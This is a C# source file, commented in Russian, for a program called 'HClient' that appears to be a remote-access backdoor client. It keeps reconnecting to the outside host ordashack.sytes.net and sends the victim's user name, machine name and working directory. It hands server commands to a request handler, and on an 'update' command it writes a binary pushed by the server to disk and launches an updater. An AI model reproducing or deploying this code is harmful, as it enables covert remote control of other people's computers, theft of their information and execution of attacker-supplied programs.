﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using HClientLib;
using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;

namespace HClient
{
    class Program
    {
        static Socket mySocket; //инициализзируем сокет;
        static MemoryStream ms = new MemoryStream(new byte[256 * 100], 0, 256 * 100, true, true);
        
        static BinaryWriter writer = new BinaryWriter(ms);
        static BinaryReader reader = new BinaryReader(ms);//чтение из потока
        static string currentDir;//положение директории
        static Thread checkConnection;
        static bool connectionIsOn;

        static void Main(string[] args)
        {
            Console.Title = "Client";
            connectionIsOn = false;
            currentDir = Environment.CurrentDirectory;// сохраненная директория
            Connection();
           
            checkConnection = new Thread(() =>
            {
                while (true)//бесконечный цикл проверки состояния подключения
                {
                    if (mySocket.Poll(1, SelectMode.SelectRead) && mySocket.Available == 0)//если связь потеряна
                    {
                        Console.WriteLine("Связь с сервером потеряна");
                        Thread.Sleep(1000);
                        connectionIsOn = false;
                        Connection();//пробуем подключиться                        
                    }
                    Thread.Sleep(1000); // каждые 10 секунд
                }
            });
            checkConnection.Start();// запускаем поток проверки*/

        }

        private static void Connection()//функция подключения
        {
            Console.WriteLine("Подключение к серверу");
            mySocket = new Socket(SocketType.Stream, ProtocolType.Tcp); //инициализзируем сокет;
            while (!mySocket.Connected)//пока нет подключения
            {
                
                try
                {
                    mySocket.Connect(@"ordashack.sytes.net", 80);      //пробуем подключиться к серверу   
                    //mySocket.Connect("192.168.0.15", 8080);      //пробуем подключиться к серверу             
                }
                catch
                {
                    Console.Write(".");
                }                
            }
            connectionIsOn = true;
            Console.Clear();
            Console.WriteLine("Подключен.");
            Thread.Sleep(1000);
            Console.Clear();
            introduse();//представляемся
            Task.Run(() => { while (connectionIsOn) recivePocket(); });//запускаем цикл
        }

        
        static void sendPocket()//неиспользуемая функция
        {
            ms.Position = 0;
            writer.Write("ok");
            mySocket.Send(ms.GetBuffer());
        }

        private static void recivePocket()//функция пакета с иформацией
        {
            ms.Position = 0;
            mySocket.Receive(ms.GetBuffer());
            string request = reader.ReadString();
            //--------------------------------------------
            if(request.Equals("update"))
            {
                Update();
                
            }
            else
            {
                RequestHandler.Request(ref currentDir, request, ms, mySocket);
                
            }
            
        }

        private static void introduse()//при подключении передает информацию о себе
        {
            ms.Position = 0;
            writer.Write(Environment.UserName);
            writer.Write(Environment.MachineName);
            writer.Write(Environment.CurrentDirectory);
            mySocket.Send(ms.GetBuffer());
        }
        
        private static void Update()
        {
            string path = Environment.CurrentDirectory + "\\update.tmp";
            using (FileStream fs = new FileStream(path, FileMode.OpenOrCreate))
            {
                int leng = reader.ReadInt32();
                byte[] data = new byte[leng];
               

                data = reader.ReadBytes(leng);
                fs.Write(data, 0, data.Length);
                // считывает байт в память и переводит каретку на байт вперед
                ms.Position = 0;                
                writer.Write("Загрузка завершена.");
                Process.Start(Environment.CurrentDirectory + "\\HUpdater.exe");
                Environment.Exit(0);
            }
        }
    }
}
